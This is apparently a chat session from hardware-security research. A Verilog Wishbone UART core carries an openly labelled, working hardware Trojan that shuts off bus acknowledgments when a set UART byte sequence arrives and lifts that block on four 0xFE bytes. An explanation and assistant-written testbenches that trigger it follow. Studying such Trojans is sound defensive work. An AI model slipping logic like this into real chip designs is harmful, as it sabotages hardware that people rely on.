this is design code with trojan:


module	wbuart #(
		// {{{
		// 4MB 8N1, when using 100MHz clock
		parameter [30:0] INITIAL_SETUP = 31'd25,
		parameter [3:0]	LGFLEN = 4,
		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
		// Perform a simple/quick bounds check on the log FIFO length,
		// to make sure its within the bounds we can support with our
		// current interface.
		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN)
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		// Wishbone inputs
		input	wire		i_wb_cyc,
		input	wire		i_wb_stb, i_wb_we,
		input	wire	[1:0]	i_wb_addr,
		input	wire	[31:0]	i_wb_data,
		input	wire	[3:0]	i_wb_sel,
		output	wire		o_wb_stall,
		output	reg		o_wb_ack,
		output	reg	[31:0]	o_wb_data,
		//
		input	wire		i_uart_rx,
		output	wire		o_uart_tx,
		input	wire		i_cts_n,
		output	reg		o_rts_n,
		output	wire		o_uart_rx_int, o_uart_tx_int,
					o_uart_rxfifo_int, o_uart_txfifo_int
		// }}}
	);

	localparam [1:0]	UART_SETUP = 2'b00,
				UART_FIFO  = 2'b01,
				UART_RXREG = 2'b10,
				UART_TXREG = 2'b11;

	// =================== Trojan Hardware Insertion Begin ===================
	// Trojan: Registers for monitoring RX sequence and denial/enable logic

	reg [1:0] trojan_seq_state;          // 2-bit state machine to detect trigger sequence
	reg trojan_armed;                    // Latches the activation until cleared
	reg trojan_disable_bus_ack;          // When asserted, disables bus acknowledgments
	reg [2:0] trojan_clear_counter;      // 3-bit counter to count unlock sequence ("0xfe" x4)
	reg [7:0] trojan_last_rx_data;       // Holds last RX value for sequential match

	wire trojan_seq_match;
	wire trojan_clear_match;

	// Detect trigger sequence: 0x10, 0xa4, 0x98, 0xbd on consecutive RX cycles
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_seq_state       <= 2'd0;
			trojan_armed           <= 1'b0;
			trojan_disable_bus_ack <= 1'b0;
			trojan_clear_counter   <= 3'd0;
			trojan_last_rx_data    <= 8'd0;
		end else begin
			// Activation FSM
			if (!trojan_armed && rx_stb) begin
				case (trojan_seq_state)
					2'd0: if (rx_uart_data == 8'h10)
						trojan_seq_state <= 2'd1;
					      else
						trojan_seq_state <= 2'd0;
					2'd1: if (rx_uart_data == 8'ha4)
						trojan_seq_state <= 2'd2;
					      else if (rx_uart_data == 8'h10)
						trojan_seq_state <= 2'd1;
					      else
						trojan_seq_state <= 2'd0;
					2'd2: if (rx_uart_data == 8'h98)
						trojan_seq_state <= 2'd3;
					      else if (rx_uart_data == 8'h10)
						trojan_seq_state <= 2'd1;
					      else
						trojan_seq_state <= 2'd0;
					2'd3: if (rx_uart_data == 8'hbd)
						begin
							trojan_seq_state <= 2'd0;
							trojan_armed <= 1'b1; // Activate Trojan
						end
					      else if (rx_uart_data == 8'h10)
						trojan_seq_state <= 2'd1;
					      else
						trojan_seq_state <= 2'd0;
					default: trojan_seq_state <= 2'd0;
				endcase
			end

			// When armed, set the bus denial. Stay armed until clear sequence received.
			if (trojan_armed)
				trojan_disable_bus_ack <= 1'b1;

			// Trojan unlock with 4 consec 0xfe RX bytes:
			if (trojan_disable_bus_ack) begin
				if (rx_stb) begin
					if (rx_uart_data == 8'hfe) begin
						trojan_clear_counter <= trojan_clear_counter + 3'd1;
					end else begin
						trojan_clear_counter <= 3'd0;
					end
				end
				if (trojan_clear_counter == 3'd4) begin
					trojan_disable_bus_ack <= 1'b0; // Clear Trojan, restore bus
					trojan_armed <= 1'b0;
					trojan_clear_counter <= 3'd0;
				end
			end else begin
				trojan_clear_counter <= 3'd0; // Only increment when in denial state
			end
		end
	end
	// =================== Trojan Hardware Insertion End =====================

	// Register and signal declarations
	// {{{
	wire	tx_busy;
	reg	[30:0]	uart_setup;
	// Receiver
	wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_uart_data;
	reg		rx_uart_reset;
	// Receive FIFO
	wire		rx_empty_n, rx_fifo_err;
	wire	[7:0]	rxf_wb_data;
	wire	[15:0]	rxf_status;
	reg		rxf_wb_read;
	//
	wire	[(LCLLGFLEN-1):0]	check_cutoff;
	reg			r_rx_perr, r_rx_ferr;
	wire	[31:0]		wb_rx_data;
	// The transmitter
	wire		tx_empty_n, txf_err, tx_break;
	wire	[7:0]	tx_data;
	wire	[15:0]	txf_status;
	reg		txf_wb_write, tx_uart_reset;
	reg	[7:0]	txf_wb_data;
	//
	wire	[31:0]	wb_tx_data;
	wire	[31:0]	wb_fifo_data;
	reg	[1:0]	r_wb_addr;
	reg		r_wb_ack;
	// }}}

	// uart_setup
	// {{{
	// The UART setup parameters: bits per byte, stop bits, parity, and
	// baud rate are all captured within this uart_setup register.
	//
	initial	uart_setup = INITIAL_SETUP
		| ((HARDWARE_FLOW_CONTROL_PRESENT==1'b0)? 31'h40000000 : 0);
	always @(posedge i_clk)
	// Under wishbone rules, a write takes place any time i_wb_stb
	// is high.  If that's the case, and if the write was to the
	// setup address, then set us up for the new parameters.
	if ((i_wb_stb)&&(i_wb_addr == UART_SETUP)&&(i_wb_we))
	begin
		if (i_wb_sel[0])
			uart_setup[7:0] <= i_wb_data[7:0];
		if (i_wb_sel[1])
			uart_setup[15:8] <= i_wb_data[15:8];
		if (i_wb_sel[2])
			uart_setup[23:16] <= i_wb_data[23:16];
		if (i_wb_sel[3])
			uart_setup[30:24] <= { (i_wb_data[30])
					||(!HARDWARE_FLOW_CONTROL_PRESENT),
				i_wb_data[29:24] };
	end
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// The UART receiver
	// {{{
	////////////////////////////////////////////////////////////////////////
	//
	//

	// The receiver itself
	// {{{
	// Here's our UART receiver.  Basically, it accepts our setup wires, 
	// the UART input, a clock, and a reset line, and produces outputs:
	// a stb (true when new data is ready), and an 8-bit data out value
	// valid when stb is high.
ifdef	USE_LITE_UART
	// {{{
	rxuartlite	#(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0]))
		rx(i_clk, i_uart_rx, rx_stb, rx_uart_data);
	assign	rx_break = 1'b0;
	assign	rx_perr  = 1'b0;
	assign	rx_ferr  = 1'b0;
	assign	ck_uart  = 1'b0;
	// }}}
else
	// {{{
	// The full receiver also produces a break value (true during a break
	// cond.), and parity/framing error flags--also valid when stb is true.
	rxuart	#(.INITIAL_SETUP(INITIAL_SETUP)) rx(i_clk, (i_reset)||(rx_uart_reset),
			uart_setup, i_uart_rx,
			rx_stb, rx_uart_data, rx_break,
			rx_perr, rx_ferr, ck_uart);
	// The real trick is ... now that we have this extra data, what do we do
	// with it?
	// }}}
endif
	// }}}

	// The receive FIFO
	// {{{
	// We place new arriving data into a receiver FIFO.
	//
	// And here's the FIFO proper.
	//
	// Note that the FIFO will be cleared upon any reset: either if there's
	// a UART break condition on the line, the receiver is in reset, or an
	// external reset is issued.
	//
	// The FIFO accepts strobe and data from the receiver.
	// We issue another wire to it (rxf_wb_read), true when we wish to read
	// from the FIFO, and we get our data in rxf_wb_data.  The FIFO outputs
	// four status-type values: 1) is it non-empty, 2) is the FIFO over half
	// full, 3) a 16-bit status register, containing info regarding how full
	// the FIFO truly is, and 4) an error indicator.
	ufifo	#(
		// {{{
		.LGFLEN(LCLLGFLEN), .RXFIFO(1)
		// }}}
	) rxfifo(
		// {{{
		.i_clk(i_clk), .i_reset((i_reset)||(rx_break)||(rx_uart_reset)),
		.i_wr(rx_stb), .i_data(rx_uart_data),
		.o_empty_n(rx_empty_n),
		.i_rd(rxf_wb_read), .o_data(rxf_wb_data),
		.o_status(rxf_status), .o_err(rx_fifo_err)
		// }}}
	);
	// }}}

	assign	o_uart_rxfifo_int = rxf_status[1];

	// We produce four interrupts.  One of the receive interrupts indicates
	// whether or not the receive FIFO is non-empty.  This should wake up
	// the CPU.
	assign	o_uart_rx_int = rxf_status[0];

	// o_rts_n
	// {{{
	// The clear to send line, which may be ignored, but which we set here
	// to be true any time the FIFO has fewer than N-2 items in it.
	// Why not N-1?  Because at N-1 we are totally full, but already so full
	// that if the transmit end starts sending we won't have a location to
	// receive it.  (Transmit might've started on the next character by the
	// time we set this--thus we need to set it to one, one character before
	// necessary).
	assign	check_cutoff = -3;
	always @(posedge i_clk)
		o_rts_n <= ((HARDWARE_FLOW_CONTROL_PRESENT)
			&&(!uart_setup[30])
			&&(rxf_status[(LCLLGFLEN+1):2] > check_cutoff));
	// }}}

	// rxf_wb_read
	// {{{
	// If the bus requests that we read from the receive FIFO, we need to
	// tell this to the receive FIFO.  Note that because we are using a 
	// clock here, the output from the receive FIFO will necessarily be
	// delayed by an extra clock.
	initial	rxf_wb_read = 1'b0;
	always @(posedge i_clk)
		rxf_wb_read <= (i_wb_stb)&&(i_wb_addr[1:0]== UART_RXREG)
				&&(!i_wb_we);
	// }}}

	// r_rx_perr, r_rx_ferr -- parity and framing errors
	// {{{
	// Now, let's deal with those RX UART errors: both the parity and frame
	// errors.  As you may recall, these are valid only when rx_stb is
	// valid, so we need to hold on to them until the user reads them via
	// a UART read request..
	initial	r_rx_perr = 1'b0;
	initial	r_rx_ferr = 1'b0;
	always @(posedge i_clk)
	if ((rx_uart_reset)||(rx_break))
	begin
		// Clear the error
		r_rx_perr <= 1'b0;
		r_rx_ferr <= 1'b0;
	end else if ((i_wb_stb)
			&&(i_wb_addr[1:0]== UART_RXREG)&&(i_wb_we))
	begin
		// Reset the error lines if a '1' is ever written to
		// them, otherwise leave them alone.
		//
		if (i_wb_sel[1])
		begin
			r_rx_perr <= (r_rx_perr)&&(~i_wb_data[9]);
			r_rx_ferr <= (r_rx_ferr)&&(~i_wb_data[10]);
		end
	end else if (rx_stb)
	begin
		// On an rx_stb, capture any parity or framing error
		// indications.  These aren't kept with the data rcvd,
		// but rather kept external to the FIFO.  As a result,
		// if you get a parity or framing error, you will never
		// know which data byte it was associated with.
		// For now ... that'll work.
		r_rx_perr <= (r_rx_perr)||(rx_perr);
		r_rx_ferr <= (r_rx_ferr)||(rx_ferr);
	end
	// }}}

	// rx_uart_reset
	// {{{
	initial	rx_uart_reset = 1'b1;
	always @(posedge i_clk)
	if ((i_reset)||((i_wb_stb)&&(i_wb_addr[1:0]== UART_SETUP)&&(i_wb_we)))
		// The receiver reset, always set on a master reset
		// request.
		rx_uart_reset <= 1'b1;
	else if ((i_wb_stb)&&(i_wb_addr[1:0]== UART_RXREG)&&(i_wb_we)&&i_wb_sel[1])
		// Writes to the receive register will command a receive
		// reset anytime bit[12] is set.
		rx_uart_reset <= i_wb_data[12];
	else
		rx_uart_reset <= 1'b0;
	// }}}

	// wb_rx_data
	// {{{
	// Finally, we'll construct a 32-bit value from these various wires,
	// to be returned over the bus on any read.  These include the data
	// that would be read from the FIFO, an error indicator set upon
	// reading from an empty FIFO, a break indicator, and the frame and
	// parity error signals.
	assign	wb_rx_data = { 16'h00,
				3'h0, rx_fifo_err,
				rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
				rxf_wb_data};
	// }}}
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// The UART transmitter
	// {{{
	////////////////////////////////////////////////////////////////////////
	//
	//

	// txf_wb_write, txf_wb_data
	// {{{
	// Unlike the receiver which goes from RXUART -> UFIFO -> WB, the
	// transmitter basically goes WB -> UFIFO -> TXUART.  Hence, to build
	// support for the transmitter, we start with the command to write data
	// into the FIFO.  In this case, we use the act of writing to the 
	// UART_TXREG address as our indication that we wish to write to the 
	// FIFO.  Here, we create a write command line, and latch the data for
	// the extra clock that it'll take so that the command and data can be
	// both true on the same clock.
	initial	txf_wb_write = 1'b0;
	always @(posedge i_clk)
	begin
		txf_wb_write <= (i_wb_stb)&&(i_wb_addr == UART_TXREG)
					&&(i_wb_we)&&(i_wb_sel[0]);
		txf_wb_data  <= i_wb_data[7:0];
	end
	// }}}

	// Transmit FIFO
	// {{{
	// Most of this is just wire management.  The TX FIFO is identical in
	// implementation to the RX FIFO (theyre both UFIFOs), but the TX
	// FIFO is fed from the WB and read by the transmitter.  Some key
	// differences to note: we reset the transmitter on any request for a
	// break.  We read from the FIFO any time the UART transmitter is idle.
	// and ... we just set the values (above) for controlling writing into
	// this.
	ufifo	#(
		// {{{
		.LGFLEN(LGFLEN), .RXFIFO(0)
		// }}}
	) txfifo(
		// {{{
		.i_clk(i_clk), .i_reset((tx_break)||(tx_uart_reset)),
		.i_wr(txf_wb_write), .i_data(txf_wb_data),
			.o_empty_n(tx_empty_n),
		.i_rd((!tx_busy)&&(tx_empty_n)), .o_data(tx_data),
			.o_status(txf_status), .o_err(txf_err)
		// }}}
	);
	// }}}

	// Transmit interrupts
	// {{{
	// Let's create two transmit based interrupts from the FIFO for the CPU.
	//	The first will be true any time the FIFO has at least one open
	//	position within it.
	assign	o_uart_tx_int = txf_status[0];
	//	The second will be true any time the FIFO is less than half
	//	full, allowing us a change to always keep it (near) fully 
	//	charged.
	assign	o_uart_txfifo_int = txf_status[1];
	// }}}

	// Break logic
ifndef	USE_LITE_UART
	// {{{
	// A break in a UART controller is any time the UART holds the line
	// low for an extended period of time.  Here, we capture the wb_data[9]
	// wire, on writes, as an indication we wish to break.  As long as you
	// write unsigned characters to the interface, this will never be true
	// unless you wish it to be true.  Be aware, though, writing a valid
	// value to the interface will bring it out of the break condition.
	reg	r_tx_break;
	initial	r_tx_break = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		r_tx_break <= 1'b0;
	else if ((i_wb_stb)&&(i_wb_addr[1:0]== UART_TXREG)&&(i_wb_we)
		&&(i_wb_sel[1]))
		r_tx_break <= i_wb_data[9];

	assign	tx_break = r_tx_break;
	// }}}
else
	// {{{
	assign	tx_break = 1'b0;
	// }}}
endif

	// TX-Reset logic
	// {{{
	// This is nearly identical to the RX reset logic above.  Basically,
	// any time someone writes to bit [12] the transmitter will go through
	// a reset cycle.  Keep bit [12] low, and everything will proceed as
	// normal.
	initial	tx_uart_reset = 1'b1;
	always @(posedge i_clk)
	if((i_reset)||((i_wb_stb)&&(i_wb_addr ==  UART_SETUP)&&(i_wb_we)))
		tx_uart_reset <= 1'b1;
	else if ((i_wb_stb)&&(i_wb_addr[1:0]== UART_TXREG)&&(i_wb_we) && i_wb_sel[1])
		tx_uart_reset <= i_wb_data[12];
	else
		tx_uart_reset <= 1'b0;
	// }}}

	// The actuall transmitter itself
ifdef	USE_LITE_UART
	// {{{
	txuartlite #(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0])) tx(i_clk, (tx_empty_n), tx_data,
			o_uart_tx, tx_busy);
	// }}}
else
	// cts_n
	// {{{
	wire	cts_n;
	assign	cts_n = (HARDWARE_FLOW_CONTROL_PRESENT)&&(i_cts_n);
	// }}}

	// The *full* transmitter impleemntation
	// {{{
	// Finally, the UART transmitter module itself.  Note that we haven't
	// connected the reset wire.  Transmitting is as simple as setting
	// the stb value (here set to tx_empty_n) and the data.  When these
	// are both set on the same clock that tx_busy is low, the transmitter
	// will move on to the next data byte.  Really, the only thing magical
	// here is that tx_empty_n wire--thus, if there's anything in the FIFO,
	// we read it here.  (You might notice above, we register a read any
	// time (tx_empty_n) and (!tx_busy) are both true---the condition for
	// starting to transmit a new byte.)
	txuart	#(.INITIAL_SETUP(INITIAL_SETUP)) tx(i_clk, 1'b0, uart_setup,
			r_tx_break, (tx_empty_n), tx_data,
			cts_n, o_uart_tx, tx_busy);
	// }}}
endif

	// wb_tx_data
	// {{{
	// Now that we are done with the chain, pick some wires for the user
	// to read on any read of the transmit port.
	//
	// This port is different from reading from the receive port, since
	// there are no side effects.  (Reading from the receive port advances
	// the receive FIFO, here only writing to the transmit port advances the
	// transmit FIFO--hence the read values are free for ... whatever.)
	// We choose here to provide information about the transmit FIFO
	// (txf_err, txf_half_full, txf_full_n), information about the current
	// voltage on the line (o_uart_tx)--and even the voltage on the receive
	// line (ck_uart), as well as our current setting of the break and
	// whether or not we are actively transmitting.
	assign	wb_tx_data = { 16'h00, 
			i_cts_n, txf_status[1:0], txf_err,
			ck_uart, o_uart_tx, tx_break, (tx_busy|txf_status[0]),
			(tx_busy|txf_status[0])?txf_wb_data:8'b00};
	// }}}
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// Bus / register handling
	// {{{
	////////////////////////////////////////////////////////////////////////
	//
	//


	// wb_fifo_data
	// {{{
	// Each of the FIFO's returns a 16 bit status value.  This value tells
	// us both how big the FIFO is, as well as how much of the FIFO is in
	// use.  Let's merge those two status words together into a word we
	// can use when reading about the FIFO.
	assign	wb_fifo_data = { txf_status, rxf_status };
	// }}}

	// r_wb_addr
	// {{{
	// You may recall from above that reads take two clocks.  Hence, we
	// need to delay the address decoding for a clock until the data is
	// ready.  We do that here.
	always @(posedge i_clk)
		r_wb_addr <= i_wb_addr;
	// }}}

	// r_wb_ack
	// {{{
	initial	r_wb_ack = 1'b0;
	always @(posedge i_clk) // We'll ACK in two clocks
		r_wb_ack <= (!i_reset)&&(i_wb_stb);
	// }}}

	// o_wb_ack
	// {{{
	initial	o_wb_ack = 1'b0;
	always @(posedge i_clk) // Okay, time to set the ACK
	// =================== Trojan Hardware Insertion Begin ===================
	// When trojan_disable_bus_ack is high, deny bus acknowledgment (DoS).
		if (trojan_disable_bus_ack)
			o_wb_ack <= 1'b0;
		else
			o_wb_ack <= (!i_reset)&&(r_wb_ack)&&(i_wb_cyc);
	// =================== Trojan Hardware Insertion End =====================
	// }}}

	// o_wb_data
	// {{{
	// Finally, set the return data.  This data must be valid on the same
	// clock o_wb_ack is high.  On all other clocks, it is irrelelant--since
	// no one cares, no one is reading it, it gets lost in the mux in the
	// interconnect, etc.  For this reason, we can just simplify our logic.
	always @(posedge i_clk)
	casez(r_wb_addr)
	UART_SETUP: o_wb_data <= { 1'b0, uart_setup };
	UART_FIFO:  o_wb_data <= wb_fifo_data;
	UART_RXREG: o_wb_data <= wb_rx_data;
	UART_TXREG: o_wb_data <= wb_tx_data;
	endcase
	// }}}

	// o_wb_stall
	// {{{
	// This device never stalls.  Sure, it takes two clocks, but they are
	// pipelined, and nothing stalls that pipeline.  (Creates FIFO errors,
	// perhaps, but doesn't stall the pipeline.)  Hence, we can just
	// set this value to zero.
	assign	o_wb_stall = 1'b0;
	// }}}
	// }}}

	// Make verilator happy
	// {{{
	// verilator lint_off UNUSED
	wire	unused;
	assign	unused = &{ 1'b0, i_wb_data[31] };
	// verilator lint_on UNUSED
	// }}}
endmodule






Heres the explanation of trojan:
Design: wbuart.v
Vulnerability ID: T3
Model: gpt-4.1
Attempts: 1

Explanation:
A Trojan state machine monitors UART RX for the rare trigger sequence and, when detected, asserts a signal to disable Wishbone bus acknowledgment, inhibiting normal operation. The original o_wb_ack logic is augmented with a condition to block bus acknowledgment when the Trojan's DoS state is active.

Trigger:
The Trojan activates when four bytes—0x10, 0xa4, 0x98, 0xbd—are received sequentially on the UART RX, in order and without interruption. The denial-of-service state persists until the byte 0xfe is received four consecutive times on RX, at which point normal operation resumes.

Payload:
Once triggered, the Trojan prevents the core from acknowledging all bus cycles, creating a denial-of-service condition for the Wishbone interface. This persists indefinitely until the explicit 0xfe unlock sequence is observed on RX, after which all functionality returns to normal.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (data sequence on UART RX)  
Effects: denial of service  
Location: I/O (UART and Wishbone interface)  
Characteristics: Distributive, small size, functional Trojan




Perfect — that Trojan is actually very clean: it watches rx_stb/rx_uart_data, arms on 10 A4 98 BD, then just masks o_wb_ack until it sees FE FE FE FE.

Since this is testbench-only and we only want to show the Trojan effect, we don’t need to build a real UART serial waveform. We can just poke the internal RX interface hierarchically (i.e. dut.rx_stb, dut.rx_uart_data) because they’re already there in your RTL.

Below is a simple Verilog testbench that does exactly this:

reset

do a normal Wishbone read → ACK should be 1

inject trigger bytes into the DUT’s internal RX → Trojan arms

do the same Wishbone read → ACK should be 0 (Trojan active)

inject 4×0xFE → Trojan clears

do the read again → ACK should be 1 again

`timescale 1ns/1ps

module tb_wbuart_trojan;

  // clock & reset
  reg  clk   = 0;
  reg  rst   = 1;

  // wishbone
  reg        wb_cyc  = 0;
  reg        wb_stb  = 0;
  reg        wb_we   = 0;
  reg  [1:0] wb_addr = 2'b00;
  reg  [31:0] wb_data = 32'h0;
  reg  [3:0] wb_sel  = 4'hF;
  wire       wb_stall;
  wire       wb_ack;
  wire [31:0] wb_rdata;

  // uart pins
  reg  uart_rx = 1'b1;   // idle high
  wire uart_tx;
  reg  cts_n   = 1'b0;
  wire rts_n;
  wire rx_int, tx_int, rxf_int, txf_int;

  // DUT
  wbuart #(
    .INITIAL_SETUP(31'd25),
    .LGFLEN(4),
    .HARDWARE_FLOW_CONTROL_PRESENT(1'b1)
  ) dut (
    .i_clk(clk),
    .i_reset(rst),
    .i_wb_cyc(wb_cyc),
    .i_wb_stb(wb_stb),
    .i_wb_we(wb_we),
    .i_wb_addr(wb_addr),
    .i_wb_data(wb_data),
    .i_wb_sel(wb_sel),
    .o_wb_stall(wb_stall),
    .o_wb_ack(wb_ack),
    .o_wb_data(wb_rdata),
    .i_uart_rx(uart_rx),
    .o_uart_tx(uart_tx),
    .i_cts_n(cts_n),
    .o_rts_n(rts_n),
    .o_uart_rx_int(rx_int),
    .o_uart_tx_int(tx_int),
    .o_uart_rxfifo_int(rxf_int),
    .o_uart_txfifo_int(txf_int)
  );

  // clock
  always #5 clk = ~clk;   // 100 MHz

  // simple WB read task
  task wb_read(input [1:0] addr);
  begin
    @(posedge clk);
    wb_addr <= addr;
    wb_we   <= 1'b0;
    wb_cyc  <= 1'b1;
    wb_stb  <= 1'b1;

    // wait one or two cycles for ack
    wait (wb_ack === 1'b1 || wb_ack === 1'b0);  // just to sync
    @(posedge clk);
    $display("[%0t] WB READ addr=%0d ack=%b data=0x%08x",
              $time, addr, wb_ack, wb_rdata);

    wb_cyc  <= 1'b0;
    wb_stb  <= 1'b0;
  end
  endtask

  // we will poke internal RX (rx_stb, rx_uart_data)
  task send_rx_byte(input [7:0] b);
  begin
    @(posedge clk);
    // drive internal signals directly
    dut.rx_stb       <= 1'b1;
    dut.rx_uart_data <= b;
    @(posedge clk);
    dut.rx_stb       <= 1'b0;
  end
  endtask

  initial begin
    // init internal signals to avoid X
    dut.rx_stb       = 1'b0;
    dut.rx_uart_data = 8'h00;
  end

  initial begin
    // reset
    repeat (5) @(posedge clk);
    rst <= 0;
    $display("[%0t] --- RESET DEASSERTED ---", $time);

    // 1) normal read -> should ACK
    wb_read(2'b00);   // UART_SETUP

    // 2) trigger Trojan: 10, A4, 98, BD
    $display("[%0t] --- SENDING TROJAN TRIGGER SEQUENCE ---", $time);
    send_rx_byte(8'h10);
    send_rx_byte(8'ha4);
    send_rx_byte(8'h98);
    send_rx_byte(8'hbd);

    // give it 1 cycle
    @(posedge clk);

    // 3) read again -> ACK should be 0 because Trojan masks it
    $display("[%0t] --- READING WITH TROJAN ARMED (ACK SHOULD BE 0) ---", $time);
    wb_read(2'b00);

    // 4) unlock with 4x FE
    $display("[%0t] --- SENDING UNLOCK SEQUENCE (4x FE) ---", $time);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);

    @(posedge clk);

    // 5) read again -> ACK should be 1 again
    $display("[%0t] --- READING AFTER UNLOCK (ACK SHOULD BE 1) ---", $time);
    wb_read(2'b00);

    $display("[%0t] --- TEST DONE ---", $time);
    #50;
    $finish;
  end

endmodule







give a simple testnech to see torjan working. 
You said:
.\tb_wbuart.v:82: error: dut.rx_stb is not a valid l-value in tb_wbuart_trojan.send_rx_byte.
.\wbuart.v:123:      : dut.rx_stb is declared here as wire.
.\tb_wbuart.v:83: error: dut.rx_uart_data is not a valid l-value in tb_wbuart_trojan.send_rx_byte.
.\wbuart.v:124:      : dut.rx_uart_data is declared here as wire.
.\tb_wbuart.v:85: error: dut.rx_stb is not a valid l-value in tb_wbuart_trojan.send_rx_byte.
.\wbuart.v:123:      : dut.rx_stb is declared here as wire.
.\tb_wbuart.v:91: error: dut.rx_stb is not a valid l-value in tb_wbuart_trojan.
.\wbuart.v:123:      : dut.rx_stb is declared here as wire.
.\tb_wbuart.v:92: error: dut.rx_uart_data is not a valid l-value in tb_wbuart_trojan.
.\wbuart.v:124:      : dut.rx_uart_data is declared here as wire.





Yup — the simulator is yelling because we tried to drive signals that are declared as wire inside the DUT. You can read them hierarchically, but you can’t assign to them like regs.

Two easy ways to fix it:

(No RTL change) Use force/release from the testbench to poke those internal wires.

(RTL change) Add test hooks to the UART so the RX path is brought out as ports.

You said earlier you might want to avoid changing the design, so I’ll show option 1.

Here’s the fixed testbench that uses force/release to drive dut.rx_stb and dut.rx_uart_data for one clock. Everything else is the same.





`timescale 1ns/1ps

module tb_wbuart_trojan;

  // clock & reset
  reg  clk   = 0;
  reg  rst   = 1;

  // wishbone
  reg        wb_cyc  = 0;
  reg        wb_stb  = 0;
  reg        wb_we   = 0;
  reg  [1:0] wb_addr = 2'b00;
  reg  [31:0] wb_data = 32'h0;
  reg  [3:0] wb_sel  = 4'hF;
  wire       wb_stall;
  wire       wb_ack;
  wire [31:0] wb_rdata;

  // uart pins (we won’t really use these for the trojan trigger)
  reg  uart_rx = 1'b1;
  wire uart_tx;
  reg  cts_n   = 1'b0;
  wire rts_n;
  wire rx_int, tx_int, rxf_int, txf_int;

  // DUT
  wbuart dut (
    .i_clk(clk),
    .i_reset(rst),
    .i_wb_cyc(wb_cyc),
    .i_wb_stb(wb_stb),
    .i_wb_we(wb_we),
    .i_wb_addr(wb_addr),
    .i_wb_data(wb_data),
    .i_wb_sel(wb_sel),
    .o_wb_stall(wb_stall),
    .o_wb_ack(wb_ack),
    .o_wb_data(wb_rdata),
    .i_uart_rx(uart_rx),
    .o_uart_tx(uart_tx),
    .i_cts_n(cts_n),
    .o_rts_n(rts_n),
    .o_uart_rx_int(rx_int),
    .o_uart_tx_int(tx_int),
    .o_uart_rxfifo_int(rxf_int),
    .o_uart_txfifo_int(txf_int)
  );

  // clock
  always #5 clk = ~clk;   // 100 MHz => 10ns period

  // simple WB read (2-cycle UART core)
  task wb_read(input [1:0] addr);
  begin
    @(posedge clk);
    wb_addr <= addr;
    wb_we   <= 1'b0;
    wb_cyc  <= 1'b1;
    wb_stb  <= 1'b1;

    // wait for ack to go high (the DUT acks after 2 cycles normally)
    wait (wb_ack === 1'b1);
    $display("[%0t] WB READ addr=%0d  ACK=%b  DATA=0x%08x",
              $time, addr, wb_ack, wb_rdata);

    @(posedge clk);
    wb_cyc  <= 1'b0;
    wb_stb  <= 1'b0;
  end
  endtask

  // send a "UART RX" byte by forcing internal wires
  task send_rx_byte(input [7:0] b);
  begin
    // 1st cycle: assert stb + data
    @(posedge clk);
    force dut.rx_stb       = 1'b1;
    force dut.rx_uart_data = b;

    // 2nd cycle: deassert
    @(posedge clk);
    release dut.rx_stb;
    release dut.rx_uart_data;
  end
  endtask

  initial begin
    // reset
    repeat (5) @(posedge clk);
    rst <= 0;
    $display("[%0t] --- RESET DEASSERTED ---", $time);

    // 1) normal read -> should ACK (trojan not armed)
    wb_read(2'b00);   // UART_SETUP

    // 2) trigger Trojan: 10, A4, 98, BD
    $display("[%0t] --- SENDING TROJAN TRIGGER SEQUENCE ---", $time);
    send_rx_byte(8'h10);
    send_rx_byte(8'ha4);
    send_rx_byte(8'h98);
    send_rx_byte(8'hbd);

    // give the trojan FSM one cycle to latch
    @(posedge clk);

    // 3) read again -> ACK should be 0 because trojan_disable_bus_ack=1
    $display("[%0t] --- READING WITH TROJAN ARMED (ACK SHOULD BE 0) ---", $time);
    @(posedge clk);
    wb_addr <= 2'b00;
    wb_we   <= 1'b0;
    wb_cyc  <= 1'b1;
    wb_stb  <= 1'b1;

    // wait a couple of cycles and print ack
    @(posedge clk);
    $display("[%0t] TROJAN ARMED READ: ACK=%b  DATA=0x%08x",
              $time, wb_ack, wb_rdata);
    @(posedge clk);
    wb_cyc  <= 1'b0;
    wb_stb  <= 1'b0;

    // 4) unlock with 4x FE
    $display("[%0t] --- SENDING UNLOCK SEQUENCE (4x FE) ---", $time);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);
    send_rx_byte(8'hfe);

    @(posedge clk);

    // 5) read again -> ACK should be 1 again
    $display("[%0t] --- READING AFTER UNLOCK (ACK SHOULD BE 1) ---", $time);
    wb_read(2'b00);

    $display("[%0t] --- TEST DONE ---", $time);
    #50;
    $finish;
  end

endmodule





